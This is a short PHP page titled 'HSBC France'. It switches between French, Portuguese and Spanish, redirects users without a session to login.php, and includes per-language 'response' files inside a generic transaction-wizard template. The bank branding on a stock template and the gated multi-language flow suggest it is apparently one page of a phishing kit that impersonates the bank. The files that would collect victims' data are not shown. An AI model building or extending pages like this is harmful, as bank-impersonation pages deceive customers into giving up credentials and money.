<?php
session_start();

if(isset($_GET['lang'])){
  if($_GET['lang'] == 'fr'){
    $_SESSION['lang'] = 'fr';
  } elseif($_GET['lang'] == 'ptg'){
    $_SESSION['lang'] = 'ptg';
  } elseif($_GET['lang'] == 'esp'){
    $_SESSION['lang'] = 'esp';
  } else {
    $_SESSION['lang'] = 'fr';
  }
} else {
  $_SESSION['lang'] = 'esp';
}

isset($_SESSION['lang']) ? $lang = $_SESSION['lang'] : $lang = 'fr';

if(!isset($_SESSION['user'])) header('Location: login.php');


?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>HSBC France</title>
	<!-- Mobile Specific Metas -->
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<!-- Font-->
	<link rel="stylesheet" type="text/css" href="transaction/css/roboto-font.css">
	<link rel="stylesheet" type="text/css" href="transaction/fonts/material-design-iconic-font/css/material-design-iconic-font.min.css">
	<link rel="stylesheet" type="text/css" href="transaction/css/bootstrap.min.css">
	<!-- datepicker -->
	<link rel="stylesheet" type="text/css" href="transaction/css/jquery-ui.min.css">
	<!-- Main Style Css -->
    <link rel="stylesheet" href="transaction/css/style.css"/>
</head>
<body>
	<div class="page-content" style="background-image: url('transaction/images/wizard-v3.jpg')">

		<?php if($lang == 'fr') : ?>
				
				<?php include 'translate/responseF.php'; ?>

				<?php elseif($lang == 'ptg')  : ?>

				<?php include 'translate/responseP.php'; ?>

				<?php else : ?>

				<?php include 'translate/responseE.php'; ?>

        <?php endif; ?>

	</div>

	<script src="transaction/js/jquery-3.3.1.min.js"></script>
	<script src="transaction/js/jquery.steps.js"></script>
	<script src="transaction/js/jquery-ui.min.js"></script>
	<script src="transaction/js/bootstrap-bundle.js"></script>
	<script src="transaction/js/jQuerySimpleCounter.js"></script>
	<script src="transaction/js/custom.js"></script>
	<script src="transaction/js/main.js"></script>
</body>
</html>